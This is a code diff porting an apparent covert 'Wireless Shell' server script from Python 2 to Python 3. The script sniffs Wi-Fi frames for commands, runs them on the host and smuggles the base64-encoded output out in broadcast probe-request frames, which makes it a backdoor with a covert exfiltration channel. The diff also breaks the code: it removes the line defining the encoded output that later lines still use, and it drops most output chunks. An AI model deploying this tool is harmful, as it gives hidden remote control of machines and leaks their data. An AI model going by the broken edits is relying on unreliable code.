@@ -6,6 +6,9 @@ import sys,time,subprocess,logging,base64
 import logging.handlers
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 from scapy.all import * 
+from scapy.layers.dot11 import Dot11Elt
+from scapy.layers.dot11 import Dot11
+from scapy.all import RadioTap
 
 # Variable Definition
 verbosity=0
@@ -15,7 +18,7 @@ chunks=5
 try:
 	interface=sys.argv[1]
 except:
-	print "Usage: python server.py mon_iface"
+	print ("Usage: python server.py mon_iface")
 	quit()
 
 # Define syslogging
@@ -33,54 +36,38 @@ def splitbysize(input,chunksize,chunks):
 
 # Command execution by subprocess (argument: command to execute)
 def executeHere(cmd):
-	print "Command requested: " + cmd
+	print("Command requested: " + cmd)
 	slogger.critical('Wireless Shell: Command requested: '+ cmd)
 	cmd = cmd.split(" ")
 
 	p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 	out, err = p.communicate()
-	out = out.rstrip("\n")  # STDOUT
-	err = err.rstrip("\n")  # STDERR
-
-	if len(out) == 0: # No STDOUT?
-		if verbosity > 2: print "Command STDERR: "
-		if verbosity > 2: print err
-		out = err
-	else:  # STDOUT present
-		if verbosity > 2: print "Command STDOUT: "
-		if verbosity > 2: print out
-	if len(out) == 0:  # No command output
-		out = "No command output!" 
-
-	# Encode command output in base64
-	outb64 = base64.b64encode(out)
+	if verbosity > 2: 
+		print("Command STDERR: ")
 
 	# Split command output (base64) in chunks
 	# Cut max size (mtu*5) of output = substr()
 	outsplit = splitbysize(outb64,mtu,chunks)
 
-	if verbosity: print "Output Length: %d(std)/%d(base64)" %(len(out),len(outb64))
-	if verbosity: print "Output Chunks: %d (size:%d)" %(len(outsplit),mtu)
-	if verbosity > 1: print out
-	if verbosity > 1: print outsplit
+	if verbosity: 
+		print("Output Length: %d(std)/%d(base64)" %(len(out),len(outb64)))
+	if verbosity: 
+		print("Output Chunks: %d (size:%d)" %(len(outsplit),mtu))
+	if verbosity > 1: 
+		print(out)
+	if verbosity > 1: 
+		print(outsplit)
 	
 	probereq =  RadioTap()
 	probereq /= Dot11(type=0,subtype=4,addr1="ff:ff:ff:ff:ff:ff", addr2=mackey, addr3="ff:ff:ff:ff:ff:ff")
 	probereq /= Dot11Elt(ID=0,info=outsplit[0])
 	probereq /= Dot11Elt(ID=1,info=outsplit[1])
-	probereq /= Dot11Elt(ID=2,info=outsplit[2])
-	probereq /= Dot11Elt(ID=3,info=outsplit[3])
-	probereq /= Dot11Elt(ID=4,info=outsplit[4])
+	if verbosity > 1: print("Sending output in Probe Request...\n")
 
-	if verbosity > 1: print "Sending output in Probe Request..."
-	if verbosity > 1: probereq.show()
-	if verbosity > 2: wrpcap('./server_probereq.cap',probereq)
-	time.sleep(2)
-	
 	try:
 		sendp(probereq, iface=interface, verbose=verbosity, count=10)
-	except Exception,e:
-		print "Exception while sending: " + str(e)
+	except Exception as e:
+		print ("Exception while sending: " + str(e))
 		exprobereq =  RadioTap()
 		exprobereq /= Dot11(type=0,subtype=4,addr1="ff:ff:ff:ff:ff:ff", addr2=mackey, addr3="ff:ff:ff:ff:ff:ff")
 		exprobereq /= Dot11Elt(ID=0,info=base64.b64encode(str(e)))
@@ -97,14 +84,14 @@ def packets(pkt):
 				# Execute command and send output in probe request frame
 				executeHere(cmd)
 				return True
-	except Exception,e:
-		print "Something extrange error happened (It wasnt me!): " + str(e)
+	except Exception as e:
+		print ("Something extrange error happened (It wasnt me!): " + str(e))
 
 # Main section
 while True:
 	try:
-		print "\nSniffing for packets..."
+		print ("\nSniffing for packets...")
 		# Start sniffing and stop when received specific beacon
 		sniff(iface=interface, stop_filter=packets)
-	except Exception,e:
-		print "Exception while sniffing: " + str(e)
+	except Exception as e:
+		print ("Exception while sniffing: " + str(e))
